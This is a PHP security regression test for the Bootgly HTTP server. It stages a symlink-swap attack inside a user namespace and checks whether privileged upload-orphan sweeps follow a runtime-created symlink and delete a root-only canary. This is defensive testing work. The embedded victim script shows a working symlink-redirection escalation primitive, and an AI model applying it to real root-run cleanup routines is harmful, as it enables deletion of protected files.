<?php

use Bootgly\WPI\Nodes\HTTP_Server_CLI\Request;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Response;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Tests\Suite\Test\Specification;


/**
 * Security PoC H2 (audit 2026-08-01) — the privileged HTTP startup orphan sweep must never follow
 * a runtime-replaceable downloaded directory symlink.
 *
 * The attack leg runs as UID 0 inside an unprivileged user namespace. It
 * refuses host-root execution rather than risking a real privileged deletion.
 * It starts a real
 * HTTP_Server_CLI subclass and stops at an exception boundary immediately
 * after the production pre-fork booting() hook, before listeners, workers, or
 * demotion.
 *
 * Controls prove that:
 *   1. the real startup path deletes an ordinary upload orphan;
 *   2. mapped runtime UID 1 owns the parent and performs the symlink swap;
 *   3. runtime UID 1 cannot read the root-owned 0700 canary tree.
 *
 * The secure assertion is that the root-only canary survives the second startup.
 * Vulnerable code fails with a finding-specific CONFIRMED H2 diagnostic. The
 * controls form the post-remediation regression baseline; a fix that relocates
 * cleanup past demotion must advance the fixture boundary accordingly.
 * A separate post-fix leg invokes the genuine worker instance path with no
 * configured runtime user and proves that its still-root identity cannot run
 * the TTL sweep through the same runtime-created symlink primitive.
 */

/** @var array<string,mixed> $probe */
$probe = [
   'error' => '',
   'executed' => false,
   'reason' => '',
   'uid' => -1,
   'runtime_uid' => 1,
   'hook_entries' => 0,
   'hook_completions' => 0,
   'hook_euids' => [],
   'control_before' => false,
   'control_after' => true,
   'runtime_denied' => false,
   'runtime_replaced' => false,
   'runtime_reason' => '',
   'download_path_is_link' => false,
   'canary_before' => false,
   'canary_after' => true,
   'worker_runtime_denied' => false,
   'worker_replaced' => false,
   'worker_reason' => '',
   'worker_download_path_is_link' => false,
   'worker_euid_before' => -1,
   'worker_euid_after' => -1,
   'worker_socket' => false,
   'worker_closed' => false,
   'worker_canary_before' => false,
   'worker_canary_after' => true,
];

return new Specification(
   description: 'privileged startup upload sweep must not follow a runtime-replaceable directory symlink',

   request: static function (string $hostPort, int $testIndex) use (&$probe): string {
      $directory = sys_get_temp_dir()
         . '/bootgly-h2-' . bin2hex(random_bytes(12));
      $process = null;
      $pipes = [];

      $Clean = static function (string $path) use (&$Clean): void {
         if (is_link($path) || is_dir($path) === false) {
            @unlink($path);
            return;
         }

         @chmod($path, 0700);
         foreach (@scandir($path) ?: [] as $entry) {
            if ($entry === '.' || $entry === '..') {
               continue;
            }
            $Clean($path . '/' . $entry);
         }
         @rmdir($path);
      };

      try {
         if (
            function_exists('proc_open') === false
            || function_exists('posix_geteuid') === false
         ) {
            throw new RuntimeException('H2 requires proc_open and POSIX support.');
         }
         if (mkdir($directory, 0700, true) === false) {
            throw new RuntimeException('H2 could not create its fixture directory.');
         }

         $victim = $directory . '/victim.php';
         $runner = $directory . '/run.sh';
         $result = $directory . '/result.json';

         $victimSource = <<<'VICTIM'
<?php

$root = $argv[1];
$base = $argv[2];
$result = $argv[3];

define('BOOTGLY_STORAGE_BASE', $base . '/storage');
define('BOOTGLY_STORAGE_DIR', $base . '/storage/');
putenv('BOOTGLY_ENVIRONMENT=production');
$_SERVER['SCRIPT_FILENAME'] = '';
require $root . '/autoboot.php';

use Bootgly\API\Endpoints\Server\Modes;
use Bootgly\API\Environments;
use Bootgly\WPI\Nodes\HTTP_Server_CLI;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Decoders\Decoder_Downloading\Downloads;

final class H2Boundary extends RuntimeException {}

final class H2Server extends HTTP_Server_CLI
{
   public int $entries = 0;
   public int $completions = 0;
   /** @var array<int,int> */
   public array $EUIDs = [];

   public static function boot (
      Environments $Environment,
      string $testsDir = 'E2E'
   ): void
   {
      // The fixture has no application bootstrap; start() must reach booting().
   }

   protected function booting (): void
   {
      $this->entries++;
      $this->EUIDs[] = posix_geteuid();

      parent::booting();

      $this->completions++;
      throw new H2Boundary('H2 pre-listener boundary');
   }
}

$data = [
   'reason' => '',
   'uid' => function_exists('posix_geteuid') ? posix_geteuid() : -1,
   'runtime_uid' => 1,
   'hook_entries' => 0,
   'hook_completions' => 0,
   'hook_euids' => [],
   'control_before' => false,
   'control_after' => true,
   'runtime_denied' => false,
   'runtime_replaced' => false,
   'runtime_reason' => '',
   'download_path_is_link' => false,
   'canary_before' => false,
   'canary_after' => true,
   'worker_runtime_denied' => false,
   'worker_replaced' => false,
   'worker_reason' => '',
   'worker_download_path_is_link' => false,
   'worker_euid_before' => -1,
   'worker_euid_after' => -1,
   'worker_socket' => false,
   'worker_closed' => false,
   'worker_canary_before' => false,
   'worker_canary_after' => true,
];

$Clean = static function (string $path) use (&$Clean): void {
   if (is_link($path) || is_dir($path) === false) {
      @unlink($path);
      return;
   }

   @chmod($path, 0700);
   foreach (@scandir($path) ?: [] as $entry) {
      if ($entry === '.' || $entry === '..') {
         continue;
      }
      $Clean($path . '/' . $entry);
   }
   @rmdir($path);
};

$Server = null;

try {
   if (
      function_exists('posix_geteuid') === false
      || function_exists('posix_seteuid') === false
      || function_exists('posix_setegid') === false
   ) {
      throw new RuntimeException('H2 attack leg requires POSIX identity controls.');
   }
   if (posix_geteuid() !== 0) {
      throw new RuntimeException('H2 attack leg is not UID 0.');
   }

   $runtimeUID = 1;
   $runtimeGID = 1;
   $canary = $base . '/canary';
   $canaryFile = $canary . '/protected.conf';
   $workerCanary = $base . '/worker-canary';
   $workerCanaryFile = $workerCanary . '/protected.conf';
   $files = BOOTGLY_STORAGE_DIR . 'temp/files';
   $downloaded = $files . '/downloaded';
   $displaced = $files . '/downloaded.displaced';
   $controlFile = $downloaded . '/legitimate-orphan';

   if (
      @mkdir($canary, 0700, true) === false
      || file_put_contents($canaryFile, 'root-only') !== 9
      || chmod($canary, 0700) === false
      || chmod($canaryFile, 0600) === false
      || @mkdir($workerCanary, 0700, true) === false
      || file_put_contents($workerCanaryFile, 'root-only-worker') !== 16
      || chmod($workerCanary, 0700) === false
      || chmod($workerCanaryFile, 0600) === false
      || touch(
         $workerCanaryFile,
         time() - Downloads::ORPHAN_TTL - 5
      ) === false
      || @mkdir($downloaded, 0700, true) === false
      || chmod(BOOTGLY_STORAGE_BASE, 0711) === false
      || chmod(BOOTGLY_STORAGE_DIR . 'temp', 0711) === false
      || file_put_contents($controlFile, 'orphan') !== 6
   ) {
      throw new RuntimeException('H2 could not create the control and canary fixtures.');
   }

   foreach ([$files, $downloaded, $controlFile] as $path) {
      if (
         @lchown($path, $runtimeUID) === false
         || @lchgrp($path, $runtimeGID) === false
      ) {
         throw new RuntimeException('H2 could not delegate the upload parent to runtime UID 1.');
      }
   }
   chmod($files, 0700);
   chmod($downloaded, 0700);
   chmod($controlFile, 0600);

   $Create = static function (): H2Server {
      $Server = new H2Server(Modes::Foreground);
      $Server->configure(
         host: '127.0.0.1',
         port: 0,
         workers: 1,
         user: 'daemon',
         group: 'daemon',
      );

      return $Server;
   };

   $Server = $Create();

   $Start = static function (H2Server $Server): void {
      try {
         $Server->start();
      }
      catch (H2Boundary) {
         return;
      }

      throw new RuntimeException('H2 startup crossed the pre-listener exception boundary.');
   };

   $data['control_before'] = is_file($controlFile);
   $Start($Server);
   clearstatcache(true);
   $data['control_after'] = is_file($controlFile);
   $data['hook_entries'] = $Server->entries;
   $data['hook_completions'] = $Server->completions;
   $data['hook_euids'] = $Server->EUIDs;

   // Model a fresh privileged launch for the attack leg rather than relying
   // on start() reentrancy or Downloads::init()'s process-local fast path.
   Downloads::destroy();
   $Server->Process->State->clean();
   $Server = $Create();

   if (
      posix_setegid($runtimeGID) === false
      || posix_seteuid($runtimeUID) === false
   ) {
      throw new RuntimeException('H2 could not enter the mapped runtime identity.');
   }

   $data['runtime_denied'] = @file_get_contents($canaryFile) === false;
   error_clear_last();
   $renamed = @rename($downloaded, $displaced);
   if ($renamed === false) {
      $renameError = error_get_last();
      $data['runtime_reason'] = (string) ($renameError['message'] ?? 'rename failed');
   }
   else {
      error_clear_last();
      $linked = @symlink($canary, $downloaded);
      if ($linked === false) {
         $linkError = error_get_last();
         $data['runtime_reason'] = (string) ($linkError['message'] ?? 'symlink failed');
      }
      $data['runtime_replaced'] = $linked;
   }

   if (
      posix_seteuid(0) === false
      || posix_setegid(0) === false
   ) {
      throw new RuntimeException('H2 could not restore UID/GID 0 after the runtime swap.');
   }

   clearstatcache(true);
   $data['download_path_is_link'] = is_link($downloaded);
   $data['canary_before'] = is_file($canaryFile);

   $Start($Server);

   clearstatcache(true);
   $data['canary_after'] = is_file($canaryFile);
   $data['hook_entries'] += $Server->entries;
   $data['hook_completions'] += $Server->completions;
   $data['hook_euids'] = [...$data['hook_euids'], ...$Server->EUIDs];

   // Exercise the exact worker instance branch reached after demote() is a
   // no-op because no runtime user was configured. Use a distinct old canary
   // so this assertion cannot be masked by the startup-sweep result above.
   Downloads::destroy();
   $Server->Process->State->clean();

   if (
      posix_setegid($runtimeGID) === false
      || posix_seteuid($runtimeUID) === false
   ) {
      throw new RuntimeException('H2 worker leg could not enter the mapped runtime identity.');
   }

   $data['worker_runtime_denied'] = @file_get_contents($workerCanaryFile) === false;
   error_clear_last();
   $removed = @unlink($downloaded);
   $workerLinked = $removed && @symlink($workerCanary, $downloaded);
   if ($workerLinked === false) {
      $workerError = error_get_last();
      $data['worker_reason'] = (string) ($workerError['message'] ?? 'worker symlink swap failed');
   }
   $data['worker_replaced'] = $workerLinked;

   if (
      posix_seteuid(0) === false
      || posix_setegid(0) === false
   ) {
      throw new RuntimeException('H2 worker leg could not restore UID/GID 0.');
   }

   clearstatcache(true);
   $data['worker_download_path_is_link'] = is_link($downloaded);
   $data['worker_canary_before'] = is_file($workerCanaryFile);
   $data['worker_euid_before'] = posix_geteuid();

   $Server = new H2Server(Modes::Foreground);
   $Server->configure(
      host: '127.0.0.1',
      port: 0,
      workers: 1,
   );
   $Socket = $Server->instance();
   $data['worker_socket'] = is_resource($Socket);
   $data['worker_euid_after'] = posix_geteuid();
   if (is_resource($Socket)) {
      $data['worker_closed'] = $Server->close();
   }

   clearstatcache(true);
   $data['worker_canary_after'] = is_file($workerCanaryFile);
}
catch (Throwable $Error) {
   $data['reason'] = $Error::class . ': ' . $Error->getMessage();
}
finally {
   if (function_exists('posix_seteuid')) {
      @posix_seteuid(0);
   }
   if (function_exists('posix_setegid')) {
      @posix_setegid(0);
   }
   Downloads::destroy();
   if ($Server instanceof H2Server) {
      $Server->Process->State->clean();
   }
   $Clean($base);
}

file_put_contents($result, json_encode($data));
exit(0);
VICTIM;

         $runnerSource = <<<'RUNNER'
#!/bin/bash
set -u
ROOT="$1"; BASE="$2"; RESULT="$3"; VICTIM="$4"
NSPID=''

cleanup() {
   if [ -n "$NSPID" ]; then
      kill "$NSPID" 2>/dev/null || true
      wait "$NSPID" 2>/dev/null || true
      NSPID=''
   fi
}
abort() {
   cleanup
   exit 143
}
trap cleanup EXIT
trap abort HUP INT TERM

mkdir -p "$BASE"

if [ "$(id -u)" = "0" ]; then
   echo "host-root-refused"
   exit 3
fi

command -v unshare   >/dev/null 2>&1 || { echo "no-unshare";   exit 3; }
command -v newuidmap >/dev/null 2>&1 || { echo "no-newuidmap"; exit 3; }
command -v newgidmap >/dev/null 2>&1 || { echo "no-newgidmap"; exit 3; }
grep -q "^$(id -un):" /etc/subuid 2>/dev/null || { echo "no-subuid"; exit 3; }
grep -q "^$(id -un):" /etc/subgid 2>/dev/null || { echo "no-subgid"; exit 3; }

SUB_UID=$(grep "^$(id -un):" /etc/subuid | head -1 | cut -d: -f2)
SUB_UID_N=$(grep "^$(id -un):" /etc/subuid | head -1 | cut -d: -f3)
SUB_GID=$(grep "^$(id -un):" /etc/subgid | head -1 | cut -d: -f2)
SUB_GID_N=$(grep "^$(id -un):" /etc/subgid | head -1 | cut -d: -f3)

FIFO="$BASE/.gate"
mkfifo "$FIFO" || { echo "no-fifo"; exit 3; }

unshare --user bash -c "read gate < '$FIFO'; exec php '$VICTIM' '$ROOT' '$BASE' '$RESULT'" &
NSPID=$!

for _ in $(seq 1 100); do
   [ -e "/proc/$NSPID/uid_map" ] && break
   sleep 0.05
done

newuidmap "$NSPID" 0 "$(id -u)" 1 1 "$SUB_UID" "$SUB_UID_N" || {
   echo "map-uid-failed"
   exit 3
}
newgidmap "$NSPID" 0 "$(id -g)" 1 1 "$SUB_GID" "$SUB_GID_N" || {
   echo "map-gid-failed"
   exit 3
}

echo gate > "$FIFO"
wait "$NSPID"
STATUS=$?
NSPID=''
exit "$STATUS"
RUNNER;

         if (
            file_put_contents($victim, $victimSource) !== strlen($victimSource)
            || file_put_contents($runner, $runnerSource) !== strlen($runnerSource)
            || chmod($runner, 0700) === false
            || chmod($directory, 0711) === false
         ) {
            throw new RuntimeException('H2 could not install its attack-leg fixtures.');
         }

         $descriptors = [
            0 => ['file', '/dev/null', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
         ];
         $process = proc_open(
            ['/bin/bash', $runner, BOOTGLY_ROOT_DIR, $directory . '/fixture', $result, $victim],
            $descriptors,
            $pipes,
            $directory,
         );
         if (is_resource($process) === false) {
            throw new RuntimeException('H2 could not start its attack leg.');
         }

         stream_set_blocking($pipes[1], false);
         stream_set_blocking($pipes[2], false);
         $output = '';
         $status = ['running' => true];
         $deadline = microtime(true) + 45.0;
         do {
            $chunk = stream_get_contents($pipes[1]);
            if ($chunk !== false) {
               $output .= $chunk;
            }
            $chunk = stream_get_contents($pipes[2]);
            if ($chunk !== false) {
               $output .= $chunk;
            }

            $status = proc_get_status($process);
            if (($status['running'] ?? false) === false) {
               break;
            }
            usleep(50000);
         }
         while (microtime(true) < $deadline);

         if (($status['running'] ?? false) === true) {
            proc_terminate($process);
            usleep(200000);
         }
         foreach ([1, 2] as $index) {
            $chunk = stream_get_contents($pipes[$index]);
            if ($chunk !== false) {
               $output .= $chunk;
            }
            fclose($pipes[$index]);
            unset($pipes[$index]);
         }
         proc_close($process);
         $process = null;

         if (is_file($result) === false) {
            $probe['reason'] = trim($output) !== ''
               ? trim($output)
               : 'H2 attack leg produced no result.';
         }
         else {
            $decoded = json_decode((string) file_get_contents($result), true);
            if (is_array($decoded) === false) {
               throw new RuntimeException('H2 attack leg produced unreadable JSON.');
            }
            foreach ($decoded as $key => $value) {
               if (array_key_exists($key, $probe)) {
                  $probe[$key] = $value;
               }
            }
            $probe['executed'] = ($decoded['reason'] ?? '') === '';
         }
      }
      catch (Throwable $Throwable) {
         $probe['error'] = $Throwable::class . ': ' . $Throwable->getMessage();
      }
      finally {
         foreach ($pipes as $pipe) {
            if (is_resource($pipe)) {
               fclose($pipe);
            }
         }
         if (is_resource($process)) {
            proc_terminate($process);
            proc_close($process);
         }
         $Clean($directory);
      }

      return "GET /h2/privileged-download-sweep HTTP/1.1\r\n"
         . "X-Bootgly-Test: {$testIndex}\r\n"
         . "Host: localhost\r\n"
         . "Connection: close\r\n"
         . "\r\n";
   },

   response: static function (Request $Request, Response $Response): Response {
      return $Response(body: 'H2 handler control');
   },

   test: static function (string $response) use (&$probe): bool|string {
      if (
         str_contains($response, 'HTTP/1.1 200 OK') === false
         || str_contains($response, 'H2 handler control') === false
      ) {
         return 'H2 fixture did not traverse the selected native HTTP handler.';
      }
      if ($probe['error'] !== '') {
         return 'H2 fixture error: ' . $probe['error'];
      }
      if ($probe['executed'] !== true) {
         return 'H2 privileged attack leg did not execute (' . $probe['reason'] . ').';
      }
      if ($probe['uid'] !== 0) {
         return 'H2 attack leg was not UID 0: ' . json_encode($probe);
      }
      if (
         $probe['hook_entries'] !== 2
         || $probe['hook_completions'] !== 2
         || $probe['hook_euids'] !== [0, 0]
         || $probe['control_before'] !== true
         || $probe['control_after'] !== false
      ) {
         return 'H2 positive control failed: the real startup hook did not run '
            . 'twice as UID 0 or delete the legitimate orphan: '
            . json_encode($probe);
      }
      if (
         $probe['runtime_uid'] !== 1
         || $probe['runtime_denied'] !== true
         || $probe['runtime_replaced'] !== true
         || $probe['download_path_is_link'] !== true
         || $probe['canary_before'] !== true
      ) {
         return 'H2 privilege-boundary controls failed: ' . json_encode($probe);
      }

      if ($probe['canary_after'] === false) {
         return 'CONFIRMED H2: UID 0 HTTP_Server_CLI::start() reached the '
            . 'pre-demote booting() hook, followed the runtime-UID-created '
            . 'downloaded directory symlink, and Downloads::sweep() deleted '
            . 'the root-only canary; controls proved the legitimate orphan was '
            . 'deleted and runtime UID 1 could not read the canary beforehand.';
      }
      if (
         $probe['worker_runtime_denied'] !== true
         || $probe['worker_replaced'] !== true
         || $probe['worker_download_path_is_link'] !== true
         || $probe['worker_euid_before'] !== 0
         || $probe['worker_euid_after'] !== 0
         || $probe['worker_socket'] !== true
         || $probe['worker_closed'] !== true
         || $probe['worker_canary_before'] !== true
      ) {
         return 'H2 root-worker controls failed (' . $probe['worker_reason'] . '): '
            . json_encode($probe);
      }
      if ($probe['worker_canary_after'] === false) {
         return 'CONFIRMED H2: a UID 0 HTTP worker with no configured runtime '
            . 'user reached HTTP_Server_CLI::instance(), followed the '
            . 'runtime-UID-created downloaded directory symlink, and deleted '
            . 'the distinct old root-only canary during its TTL sweep.';
      }

      return true;
   },
);
